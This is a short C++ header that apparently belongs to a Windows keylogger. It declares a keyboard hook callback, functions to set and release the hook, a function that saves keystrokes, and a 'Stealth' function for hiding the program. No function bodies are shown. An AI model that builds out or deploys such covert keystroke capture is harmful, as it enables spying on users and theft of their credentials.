#pragma once

#include <Windows.h>
#include <time.h>
#include <iostream>
#include <cstdio>
#include <fstream>
#include <string>

#include "KeyLogger.h"

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);

void SetHook();

void ReleaseHook();

int Save(int key_stroke);

void Stealth();